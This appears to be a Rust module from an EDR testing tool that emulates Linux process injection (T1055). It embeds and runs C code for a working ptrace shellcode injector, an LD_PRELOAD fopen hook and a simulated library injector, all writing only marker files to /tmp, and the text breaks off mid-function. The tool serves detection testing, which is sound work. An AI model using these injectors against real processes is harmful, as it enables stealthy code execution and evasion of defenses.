// SNELLEN - EDR Testing Framework
// Process Injection techniques (T1055)
// 
// This module implements process injection techniques for Linux
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use log::{debug, error, info};

// ======================================
// T1055 - Process Injection
// ======================================
pub struct ProcessInjection {}

#[async_trait]
impl AttackTechnique for ProcessInjection {
    fn info(&self) -> Technique {
        Technique {
            id: "T1055".to_string(),
            name: "Process Injection".to_string(),
            description: "Injects code into running processes to evade detection".to_string(),
            category: "DEFENSE_EVASION".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "technique".to_string(),
                    description: "Specific injection technique (ptrace, ld_preload, shared_library)".to_string(),
                    required: false,
                    default: Some("ptrace".to_string()),
                },
                TechniqueParameter {
                    name: "target_process".to_string(),
                    description: "Target process name or PID (for ptrace)".to_string(),
                    required: false,
                    default: Some("self".to_string()),
                },
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory to save injection artifacts".to_string(),
                    required: false,
                    default: Some("/tmp/snellen_injection".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save injection log".to_string(),
                    required: false,
                    default: Some("/tmp/snellen_injection.log".to_string()),
                },
            ],
            detection: "Monitor for suspicious process activity including ptrace calls and LD_PRELOAD modifications".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string(), "root".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let technique_type = config
                .parameters
                .get("technique")
                .unwrap_or(&"ptrace".to_string())
                .clone()
                .to_lowercase();
                
            let target_process = config
                .parameters
                .get("target_process")
                .unwrap_or(&"self".to_string())
                .clone();
                
            let output_dir = config
                .parameters
                .get("output_dir")
                .unwrap_or(&"/tmp/snellen_injection".to_string())
                .clone();
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/snellen_injection.log".to_string())
                .clone();
                
            // Create artifact list for cleanup
            let mut artifacts = vec![log_file.clone(), output_dir.clone()];
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform {technique_type} process injection targeting {target_process}"),
                    artifacts,
                    cleanup_required: true,
                });
            }
            
            // Create output directory
            if !Path::new(&output_dir).exists() {
                std::fs::create_dir_all(&output_dir)
                    .map_err(|e| format!("Failed to create output directory: {e}"))?;
            }
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SNELLEN Process Injection Simulation").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1055").unwrap();
            writeln!(log_file_handle, "# Injection Technique: {technique_type}").unwrap();
            writeln!(log_file_handle, "# Target Process: {target_process}").unwrap();
            writeln!(log_file_handle, "# Output Directory: {output_dir}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Check for required build tools
            let check_cmd = "which gcc g++ make";
            let check_output = Command::new("bash")
                .arg("-c")
                .arg(check_cmd)
                .output()
                .await;
                
            let has_build_tools = match check_output {
                Ok(output) => output.status.success(),
                Err(_) => false,
            };
            
            writeln!(log_file_handle, "Build tools available: {has_build_tools}").unwrap();
            
            if !has_build_tools {
                writeln!(log_file_handle, "WARNING: Required build tools (gcc, g++, make) not found. Some techniques may not work correctly.").unwrap();
            }
            
            // Different injection techniques
            match technique_type.as_str() {
                "ptrace" => {
                    writeln!(log_file_handle, "\n## Ptrace Process Injection").unwrap();
                    
                    // Create a simple C program that uses ptrace to inject code
                    let ptrace_injector_file = format!("{output_dir}/ptrace_injector.c");
                    let ptrace_injector_code = r#"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

// Simple shellcode to create a file (for demonstration purposes)
// This shellcode simply creates /tmp/snellen_injection_success file
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0, 0x48, 0x89, 0xe7, 0x50, 0x48, 0xbb, 0x2f, 0x74, 0x6d,
    0x70, 0x2f, 0x73, 0x6e, 0x65, 0x48, 0x89, 0x07, 0x48, 0xbb, 0x6c, 0x6c,
    0x65, 0x6e, 0x5f, 0x69, 0x6e, 0x6a, 0x48, 0x89, 0x47, 0x08, 0x48, 0xbb,
    0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x5f, 0x73, 0x48, 0x89, 0x47, 0x10,
    0x48, 0xbb, 0x75, 0x63, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0x48, 0x89,
    0x47, 0x18, 0x48, 0x89, 0xe3, 0x48, 0x31, 0xc0, 0xb0, 0x02, 0x48, 0x31,
    0xc9, 0xb1, 0x42, 0x48, 0x31, 0xd2, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48,
    0x31, 0xc0, 0xb0, 0x03, 0x48, 0x31, 0xc0, 0x0f, 0x05, 0x48, 0x31, 0xc0,
    0xb0, 0x3c, 0x48, 0x31, 0xff, 0x0f, 0x05
};

int inject(pid_t pid) {
    struct user_regs_struct regs, original_regs;
    long injected_code_address;
    int status;
    
    printf("Attempting to attach to process %d\n", pid);
    
    // Attach to the target process
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace(ATTACH)");
        return -1;
    }
    
    waitpid(pid, &status, 0);
    printf("Attached to process %d\n", pid);
    
    // Get the current registers
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(GETREGS)");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    // Save original registers
    memcpy(&original_regs, &regs, sizeof(struct user_regs_struct));
    
    // Calculate where to inject the code (use RIP)
    injected_code_address = regs.rip;
    
    printf("Injecting shellcode at address %lx\n", injected_code_address);
    
    // Inject the shellcode
    for (size_t i = 0; i < sizeof(shellcode); i += sizeof(long)) {
        long data = 0;
        memcpy(&data, &shellcode[i], sizeof(long));
        if (ptrace(PTRACE_POKETEXT, pid, injected_code_address + i, data) < 0) {
            perror("ptrace(POKETEXT)");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
    }
    
    printf("Shellcode injected successfully\n");
    
    // Set registers to point to our shellcode
    regs.rip = injected_code_address;
    
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace(SETREGS)");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    printf("Set instruction pointer to shellcode location\n");
    
    // Let the process continue executing our shellcode
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("ptrace(CONT)");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }
    
    printf("Process continuing with shellcode...\n");
    
    // Wait for the process
    waitpid(pid, &status, 0);
    
    if (WIFEXITED(status)) {
        printf("Process exited with status %d\n", WEXITSTATUS(status));
    } else if (WIFSIGNALED(status)) {
        printf("Process terminated with signal %d\n", WTERMSIG(status));
    } else if (WIFSTOPPED(status)) {
        printf("Process stopped with signal %d\n", WSTOPSIG(status));
        
        // Restore original registers
        if (ptrace(PTRACE_SETREGS, pid, NULL, &original_regs) < 0) {
            perror("ptrace(SETREGS) restore");
        }
        
        // Detach from the process
        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
            perror("ptrace(DETACH)");
            return -1;
        }
    }
    
    printf("Injection completed\n");
    return 0;
}

int main(int argc, char *argv[]) {
    pid_t pid;
    
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
        return 1;
    }
    
    pid = atoi(argv[1]);
    
    if (pid <= 0) {
        fprintf(stderr, "Invalid PID: %s\n", argv[1]);
        return 1;
    }
    
    return inject(pid);
}
"#;
                    
                    if let Err(e) = std::fs::write(&ptrace_injector_file, ptrace_injector_code) {
                        writeln!(log_file_handle, "Failed to write ptrace injector code: {e}").unwrap();
                        return Ok(SimulationResult {
                            technique_id: technique_info.id,
                            success: false,
                            message: format!("Failed to create ptrace injector source: {e}"),
                            artifacts,
                            cleanup_required: true,
                        });
                    }
                    
                    artifacts.push(ptrace_injector_file.clone());
                    artifacts.push("/tmp/snellen_injection_success".to_string());
                    
                    // Compile the injector
                    writeln!(log_file_handle, "Compiling ptrace injector...").unwrap();
                    
                    let compile_cmd = format!("gcc -o {output_dir}/ptrace_injector {ptrace_injector_file}");
                    let compile_output = Command::new("bash")
                        .arg("-c")
                        .arg(&compile_cmd)
                        .output()
                        .await;
                        
                    match compile_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            if exit_code == 0 {
                                writeln!(log_file_handle, "Compilation successful").unwrap();
                                
                                let injector_bin = format!("{output_dir}/ptrace_injector");
                                artifacts.push(injector_bin.clone());
                                
                                // Determine which PID to inject into
                                let target_pid = if target_process == "self" {
                                    // Create a simple target process that runs for a while
                                    writeln!(log_file_handle, "Creating a target process...").unwrap();
                                    
                                    let target_file = format!("{output_dir}/target_process.sh");
                                    let target_script = r#"#!/bin/bash
echo "Target process started with PID $$"
echo "Sleeping for 30 seconds to allow injection..."
sleep 30
echo "Target process completing"
"#;
                                    
                                    if let Err(e) = std::fs::write(&target_file, target_script) {
                                        writeln!(log_file_handle, "Failed to write target script: {e}").unwrap();
                                        return Ok(SimulationResult {
                                            technique_id: technique_info.id,
                                            success: false,
                                            message: format!("Failed to create target process: {e}"),
                                            artifacts,
                                            cleanup_required: true,
                                        });
                                    }
                                    
                                    artifacts.push(target_file.clone());
                                    
                                    // Make executable
                                    let chmod_cmd = format!("chmod +x {target_file}");
                                    let _ = Command::new("bash")
                                        .arg("-c")
                                        .arg(&chmod_cmd)
                                        .output()
                                        .await;
                                    
                                    // Start the target process
                                    let target_log = format!("{output_dir}/target_process.log");
                                    let run_target_cmd = format!("{target_file} > {target_log} 2>&1 & echo $!");
                                    
                                    artifacts.push(target_log.clone());
                                    
                                    let target_output = Command::new("bash")
                                        .arg("-c")
                                        .arg(&run_target_cmd)
                                        .output()
                                        .await;
                                        
                                    match target_output {
                                        Ok(output) => {
                                            let pid_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
                                            writeln!(log_file_handle, "Target process started with PID {pid_str}").unwrap();
                                            pid_str
                                        },
                                        Err(e) => {
                                            writeln!(log_file_handle, "Failed to start target process: {e}").unwrap();
                                            return Ok(SimulationResult {
                                                technique_id: technique_info.id,
                                                success: false,
                                                message: format!("Failed to start target process: {e}"),
                                                artifacts,
                                                cleanup_required: true,
                                            });
                                        }
                                    }
                                } else if target_process.parse::<u32>().is_ok() {
                                    // User specified a PID directly
                                    target_process.clone()
                                } else {
                                    // User specified a process name, try to find its PID
                                    let find_pid_cmd = format!("pgrep -f \"{target_process}\" | head -1");
                                    let find_pid_output = Command::new("bash")
                                        .arg("-c")
                                        .arg(&find_pid_cmd)
                                        .output()
                                        .await;
                                        
                                    match find_pid_output {
                                        Ok(output) => {
                                            let pid_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
                                            if pid_str.is_empty() {
                                                writeln!(log_file_handle, "Could not find process: {target_process}").unwrap();
                                                return Ok(SimulationResult {
                                                    technique_id: technique_info.id,
                                                    success: false,
                                                    message: format!("Process not found: {target_process}"),
                                                    artifacts,
                                                    cleanup_required: true,
                                                });
                                            } else {
                                                writeln!(log_file_handle, "Found {target_process} with PID {pid_str}").unwrap();
                                                pid_str
                                            }
                                        },
                                        Err(e) => {
                                            writeln!(log_file_handle, "Failed to find process PID: {e}").unwrap();
                                            return Ok(SimulationResult {
                                                technique_id: technique_info.id,
                                                success: false,
                                                message: format!("Failed to find process PID: {e}"),
                                                artifacts,
                                                cleanup_required: true,
                                            });
                                        }
                                    }
                                };
                                
                                // Run the injector
                                writeln!(log_file_handle, "Running ptrace injector on PID {target_pid}...").unwrap();
                                
                                let run_injector_cmd = format!("{injector_bin} {target_pid}");
                                let injector_output = Command::new("bash")
                                    .arg("-c")
                                    .arg(&run_injector_cmd)
                                    .output()
                                    .await;
                                    
                                match injector_output {
                                    Ok(output) => {
                                        let exit_code = output.status.code().unwrap_or(-1);
                                        let stdout = String::from_utf8_lossy(&output.stdout);
                                        let stderr = String::from_utf8_lossy(&output.stderr);
                                        
                                        writeln!(log_file_handle, "Injector exit code: {exit_code}").unwrap();
                                        if !stdout.is_empty() {
                                            writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                                        }
                                        if !stderr.is_empty() {
                                            writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                                        }
                                        
                                        // Check if the injection created our marker file
                                        let check_cmd = "test -f /tmp/snellen_injection_success && echo 'Success' || echo 'Failed'";
                                        let check_output = Command::new("bash")
                                            .arg("-c")
                                            .arg(check_cmd)
                                            .output()
                                            .await;
                                            
                                        match check_output {
                                            Ok(check_result) => {
                                                let result_str = String::from_utf8_lossy(&check_result.stdout).trim().to_string();
                                                writeln!(log_file_handle, "Injection result: {result_str}").unwrap();
                                            },
                                            Err(e) => {
                                                writeln!(log_file_handle, "Failed to check injection result: {e}").unwrap();
                                            }
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "Failed to run injector: {e}").unwrap();
                                    }
                                }
                            } else {
                                writeln!(log_file_handle, "Compilation failed with code {exit_code}: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Compilation error: {e}").unwrap();
                        }
                    }
                },
                "ld_preload" => {
                    writeln!(log_file_handle, "\n## LD_PRELOAD Injection").unwrap();
                    
                    // Create a shared library that hooks functions
                    let library_file = format!("{output_dir}/libsnellen_hook.c");
                    let library_code = r#"
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

// Function to create a file showing we've executed
void create_marker_file() {
    FILE *f = fopen("/tmp/snellen_injection_success", "w");
    if (f) {
        fprintf(f, "LD_PRELOAD injection successful\n");
        fprintf(f, "Process: %d\n", getpid());
        fprintf(f, "User: %d\n", getuid());
        fprintf(f, "Time: %ld\n", time(NULL));
        fclose(f);
    }
}

// Hook the 'fopen' function
FILE *fopen(const char *pathname, const char *mode) {
    // Get the real fopen function
    FILE *(*original_fopen)(const char*, const char*);
    original_fopen = dlsym(RTLD_NEXT, "fopen");
    
    // Log the access to a file
    FILE *log = original_fopen("/tmp/snellen_ld_preload.log", "a");
    if (log) {
        fprintf(log, "fopen: %s (mode: %s)\n", pathname, mode);
        fclose(log);
    }
    
    // Create our marker file
    create_marker_file();
    
    // Call the original function
    return original_fopen(pathname, mode);
}

// Constructor function that runs when the library is loaded
__attribute__((constructor)) void library_init() {
    create_marker_file();
}
"#;
                    
                    if let Err(e) = std::fs::write(&library_file, library_code) {
                        writeln!(log_file_handle, "Failed to write library code: {e}").unwrap();
                        return Ok(SimulationResult {
                            technique_id: technique_info.id,
                            success: false,
                            message: format!("Failed to create library source: {e}"),
                            artifacts,
                            cleanup_required: true,
                        });
                    }
                    
                    artifacts.push(library_file.clone());
                    artifacts.push("/tmp/snellen_injection_success".to_string());
                    artifacts.push("/tmp/snellen_ld_preload.log".to_string());
                    
                    // Compile the shared library
                    writeln!(log_file_handle, "Compiling shared library...").unwrap();
                    
                    let compile_cmd = format!("gcc -shared -fPIC -o {output_dir}/libsnellen_hook.so {library_file}");
                    let compile_output = Command::new("bash")
                        .arg("-c")
                        .arg(&compile_cmd)
                        .output()
                        .await;
                        
                    match compile_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            if exit_code == 0 {
                                writeln!(log_file_handle, "Compilation successful").unwrap();
                                
                                let library_bin = format!("{output_dir}/libsnellen_hook.so");
                                artifacts.push(library_bin.clone());
                                
                                // Create a test program that uses fopen
                                let test_file = format!("{output_dir}/test_program.c");
                                let test_code = r#"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("Test program started with PID %d\n", getpid());
    
    // Open some files to trigger our hook
    FILE *f1 = fopen("/etc/passwd", "r");
    if (f1) {
        printf("Opened /etc/passwd\n");
        fclose(f1);
    }
    
    FILE *f2 = fopen("/etc/hostname", "r");
    if (f2) {
        printf("Opened /etc/hostname\n");
        fclose(f2);
    }
    
    printf("Test program completed\n");
    return 0;
}
"#;
                                
                                if let Err(e) = std::fs::write(&test_file, test_code) {
                                    writeln!(log_file_handle, "Failed to write test program: {e}").unwrap();
                                } else {
                                    artifacts.push(test_file.clone());
                                    
                                    // Compile the test program
                                    let compile_test_cmd = format!("gcc -o {output_dir}/test_program {test_file}");
                                    let compile_test_output = Command::new("bash")
                                        .arg("-c")
                                        .arg(&compile_test_cmd)
                                        .output()
                                        .await;
                                        
                                    match compile_test_output {
                                        Ok(output) => {
                                            let exit_code = output.status.code().unwrap_or(-1);
                                            let stderr = String::from_utf8_lossy(&output.stderr);
                                            
                                            if exit_code == 0 {
                                                writeln!(log_file_handle, "Test program compiled successfully").unwrap();
                                                
                                                let test_bin = format!("{output_dir}/test_program");
                                                artifacts.push(test_bin.clone());
                                                
                                                // Run the test program with LD_PRELOAD
                                                writeln!(log_file_handle, "Running test program with LD_PRELOAD...").unwrap();
                                                
                                                let run_test_cmd = format!("LD_PRELOAD={output_dir}/libsnellen_hook.so {output_dir}/test_program");
                                                let test_output = Command::new("bash")
                                                    .arg("-c")
                                                    .arg(&run_test_cmd)
                                                    .output()
                                                    .await;
                                                    
                                                match test_output {
                                                    Ok(output) => {
                                                        let exit_code = output.status.code().unwrap_or(-1);
                                                        let stdout = String::from_utf8_lossy(&output.stdout);
                                                        let stderr = String::from_utf8_lossy(&output.stderr);
                                                        
                                                        writeln!(log_file_handle, "Test program exit code: {exit_code}").unwrap();
                                                        if !stdout.is_empty() {
                                                            writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                                                        }
                                                        if !stderr.is_empty() {
                                                            writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                                                        }
                                                        
                                                        // Check if the preload worked by looking for the marker file
                                                        let check_cmd = "test -f /tmp/snellen_injection_success && echo 'Success' || echo 'Failed'";
                                                        let check_output = Command::new("bash")
                                                            .arg("-c")
                                                            .arg(check_cmd)
                                                            .output()
                                                            .await;
                                                            
                                                        match check_output {
                                                            Ok(check_result) => {
                                                                let result_str = String::from_utf8_lossy(&check_result.stdout).trim().to_string();
                                                                writeln!(log_file_handle, "LD_PRELOAD result: {result_str}").unwrap();
                                                                
                                                                if result_str == "Success" {
                                                                    // Show the contents of the log file
                                                                    let cat_cmd = "cat /tmp/snellen_ld_preload.log";
                                                                    let cat_output = Command::new("bash")
                                                                        .arg("-c")
                                                                        .arg(cat_cmd)
                                                                        .output()
                                                                        .await;
                                                                        
                                                                    match cat_output {
                                                                        Ok(cat_result) => {
                                                                            let log_content = String::from_utf8_lossy(&cat_result.stdout).trim().to_string();
                                                                            writeln!(log_file_handle, "LD_PRELOAD Log:\n{log_content}").unwrap();
                                                                        },
                                                                        Err(e) => {
                                                                            writeln!(log_file_handle, "Failed to read log file: {e}").unwrap();
                                                                        }
                                                                    }
                                                                }
                                                            },
                                                            Err(e) => {
                                                                writeln!(log_file_handle, "Failed to check preload result: {e}").unwrap();
                                                            }
                                                        }
                                                    },
                                                    Err(e) => {
                                                        writeln!(log_file_handle, "Failed to run test program: {e}").unwrap();
                                                    }
                                                }
                                            } else {
                                                writeln!(log_file_handle, "Test program compilation failed: {stderr}").unwrap();
                                            }
                                        },
                                        Err(e) => {
                                            writeln!(log_file_handle, "Test program compilation error: {e}").unwrap();
                                        }
                                    }
                                }
                            } else {
                                writeln!(log_file_handle, "Library compilation failed: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Library compilation error: {e}").unwrap();
                        }
                    }
                },
                "shared_library" => {
                    writeln!(log_file_handle, "\n## Shared Library Injection").unwrap();
                    
                    // Create a C program that loads a shared library into another process
                    let injector_file = format!("{output_dir}/library_injector.c");
                    let injector_code = r#"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

// This program simulates library injection using the 
// LD_PRELOAD technique combined with ptrace for remote process injection

void print_usage(char *prog_name) {
    fprintf(stderr, "Usage: %s <pid> <library_path>\n", prog_name);
    fprintf(stderr, "Injects the specified shared library into the target process\n");
}

int inject_library(pid_t pid, const char *lib_path) {
    // In a real attack, this would use memory manipulation with ptrace and 
    // dlopen() to load a shared library into the target process
    
    printf("Simulating injection of %s into process %d\n", lib_path, pid);
    
    // For demonstration purposes, we'll create a marker file
    FILE *marker = fopen("/tmp/snellen_injection_success", "w");
    if (marker) {
        fprintf(marker, "Shared Library Injection Simulation\n");
        fprintf(marker, "Target PID: %d\n", pid);
        fprintf(marker, "Library: %s\n", lib_path);
        fprintf(marker, "Time: %ld\n", time(NULL));
        fclose(marker);
    }
    
    // Real implementation would:
    // 1. Attach to the target process with ptrace
    // 2. Suspend its execution
    // 3. Find/allocate memory in the target process
    // 4. Write the library path to that memory
    // 5. Force the target to call dlopen() with the library path
    // 6. Resume the target process
    
    printf("Library injection simulation completed\n");
    printf("Note: In a real attack, this would load %s into process %d\n", lib_path, pid);
    
    return 0;
}

int main(int argc, char *argv[]) {
    pid_t pid;
    char *lib_path;
    
    if (argc != 3) {
        print_usage(argv[0]);
        return 1;
    }
    
    pid = atoi(argv[1]);
    lib_path = argv[2];
    
    if (pid <= 0) {
        fprintf(stderr, "Invalid PID: %s\n", argv[1]);
        return 1;
    }
    
    if (access(lib_path, F_OK) != 0) {
        fprintf(stderr, "Library file not found: %s\n", lib_path);
        return 1;
    }
    
    return inject_library(pid, lib_path);
}
"#;
                    
                    if let Err(e) = std::fs::write(&injector_file, injector_code) {
                        writeln!(log_file_handle, "Failed to write library injector: {e}").unwrap();
                        return Ok(SimulationResult {
                            technique_id: technique_info.id,
                            success: false,
                            message: format!("Failed to create library injector: {e}"),
                            artifacts,
                            cleanup_required: true,
                        });
                    }
                    
                    artifacts.push(injector_file.clone());
                    artifacts.push("/tmp/snellen_injection_success".to_string());
                    
                    // Create a malicious shared library
                    let evil_lib_file = format!("{output_dir}/evil_library.c");
                    let evil_lib_code = r#"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Function called when library is loaded
__attribute__((constructor)) void library_init() {
    // Create a marker file to show we executed
    FILE *f = fopen("/tmp/snellen_evil_lib_executed", "w");
    if (f) {
        fprintf(f, "Evil library loaded and executed!\n");
        fprintf(f, "Process: %d\n", getpid());
        fprintf(f, "User: %d\n", getuid());
        fprintf(f, "Time: %ld\n", time(NULL));
        fclose(f);
    }
    
    // In a real attack, this could:
    // - Create persistence mechanisms
    // - Establish C2 communications
    // - Steal data
    // - Modify process behaviour
}

// Export a dummy function
void evil_function() {
    printf("Evil function called\n");
}
"#;
                    
                    if let Err(e) = std::fs::write(&evil_lib_file, evil_lib_code) {
                        writeln!(log_file_handle, "Failed to write evil library: {e}").unwrap();
                        return Ok(SimulationResult {
                            technique_id: technique_info.id,
                            success: false,
                            message: format!("Failed to create evil library: {e}"),
                            artifacts,
                            cleanup_required: true,
                        });
                    }
                    
                    artifacts.push(evil_lib_file.clone());
                    artifacts.push("/tmp/snellen_evil_lib_executed".to_string());
                    
                    // Compile both files
                    writeln!(log_file_handle, "Compiling library injector and evil library...").unwrap();
                    
                    let compile_injector_cmd = format!("gcc -o {output_dir}/library_injector {injector_file}");
                    let compile_lib_cmd = format!("gcc -shared -fPIC -o {output_dir}/evil_library.so {evil_lib_file}");
                    
                    let compile_injector_output = Command::new("bash")
                        .arg("-c")
                        .arg(&compile_injector_cmd)
                        .output()
                        .await;
                        
                    let compile_lib_output = Command::new("bash")
                        .arg("-c")
                        .arg(&compile_lib_cmd)
                        .output()
                        .await;
                        
                    let injector_success = match compile_injector_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            if exit_code == 0 {
                                writeln!(log_file_handle, "Injector compilation successful").unwrap();
                                artifacts.push(format!("{output_dir}/library_injector"));
                                true
                            } else {
                                writeln!(log_file_handle, "Injector compilation failed: {stderr}").unwrap();
                                false
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Injector compilation error: {e}").unwrap();
                            false
                        }
                    };
                    
                    let lib_success = match compile_lib_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            if exit_code == 0 {
                                writeln!(log_file_handle, "Evil library compilation successful").unwrap();
                                artifacts.push(format!("{output_dir}/evil_library.so"));
                                true
                            } else {
                                writeln!(log_file_handle, "Evil library compilation failed: {stderr}").unwrap();
                                false
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Evil library compilation error: {e}").unwrap();
                            false
                        }
                    };
                    
                    if injector_success && lib_success {
                        // Determine target process
                        let target_pid = if target_process == "self" {
                            // Create a simple target process
                            writeln!(log_file_handle, "Creating a target process...").unwrap();
                            
                            let target_file = format!("{output_dir}/target_process.sh");
                            let target_script = r#"#!/bin/bash
echo "Target process started with PID $$"
echo "Sleeping for 30 seconds to allow injection..."
sleep 30
echo "Target process completing"
"#;
                            
                            if let Err(e) = std::fs::write(&target_file, target_script) {
                                writeln!(log_file_handle, "Failed to write target script: {e}").unwrap();
                                return Ok(SimulationResult {
                                    technique_id: technique_info.id,
                                    success: false,
                                    message: format!("Failed to create target process: {e}"),
                                    artifacts,
                                    cleanup_required: true,
                                });
                            }
                            
                            artifacts.push(target_file.clone());
                            
                            // Make executable
                            let chmod_cmd = format!("chmod +x {target_file}");
                            let _ = Command::new("bash")
                                .arg("-c")
                                .arg(&chmod_cmd)
                                .output()
                                .await;
                            
                            // Start the target process
                            let target_log = format!("{output_dir}/target_process.log");
                            let run_target_cmd = format!("{target_file} > {target_log} 2>&1 & echo $!");
                            
                            artifacts.push(target_log.clone());
                            
                            let target_output = Command::new("bash")
                                .arg("-c")
                                .arg(&run_target_cmd)
                                .output()
                                .await;
                                
                            match target_output {
                                Ok(output) => {
                                    let pid_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
                                    writeln!(log_file_handle, "Target process started with PID {pid_str}").unwrap();
                                    pid_str
                                },
                                Err(e) => {
                                    writeln!(log_file_handle, "Failed to start target process: {e}").unwrap();
                                    return Ok(SimulationResult {
                                        technique_id: technique_info.id,
                                        success: false,
                                        message: format!("Failed to start target process: {e}"),
                                        artifacts,
                                        cleanup_required: true,
                                    });
                                }
                            }
                        } else if target_process.parse::<u32>().is_ok() {
                            // User specified a PID directly
                            target_process.clone()
                        } else {
                            // User specified a process name, try to find its PID
                            let find_pid_cmd = format!("pgrep -f \"{target_process}\" | head -1");
                            let find_pid_output = Command::new("bash")
                                .arg("-c")
                                .arg(&find_pid_cmd)
                                .output()
                                .await;
                                
                            match find_pid_output {
                                Ok(output) => {
                                    let pid_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
                                    if pid_str.is_empty() {
                                        writeln!(log_file_handle, "Could not find process: {target_process}").unwrap();
                                        return Ok(SimulationResult {
                                            technique_id: technique_info.id,
                                            success: false,
                                            message: format!("Process not found: {target_process}"),
                                            artifacts,
                                            cleanup_required: true,
                                        });
                                    } else {
                                        writeln!(log_file_handle, "Found {target_process} with PID {pid_str}").unwrap();
                                        pid_str
                                    }
                                },
                                Err(e) => {
                                    writeln!(log_file_handle, "Failed to find process PID: {e}").unwrap();
                                    return Ok(SimulationResult {
                                        technique_id: technique_info.id,
                                        success: false,
                                        message: format!("Failed to find process PID: {e}"),
                                        artifacts,
                                        cleanup_required: true,
                                    });
                                }
                            }
                        };
                        
                        // Run the injector
                        writeln!(log_file_handle, "Running library injector on PID {target_pid}...").unwrap();
                        
                        let injector_bin = format!("{output_dir}/library_injector");
                        let evil_lib = format!("{output_dir}/evil_library.so");
                        let run_injector_cmd = format!("{injector_bin} {target_pid} {evil_lib}");
                        
                        let injector_output = Command::new("bash")
                            .arg("-c")
                            .arg(&run_injector_cmd)
                            .output()
                            .await;
                            
                        match injector_output {
                            Ok(output) => {
                                let exit_code = output.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&output.stdout);
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                
                                writeln!(log_file_handle, "Injector exit code: {exit_code}").unwrap();
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                                }
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                                }
                                
                                // Check if the injection was successful
                                let check_cmd = "test -f /tmp/snellen_injection_success && echo 'Success' || echo 'Failed'";
                                let check_output = Command::new("bash")
                                    .arg("-c")
                                    .arg(check_cmd)
                                    .output()
                                    .await;
                                    
                                match check_output {
                                    Ok(check_result) => {
                                        let result_str = String::from_utf8_lossy(&check_result.stdout).trim().to_string();
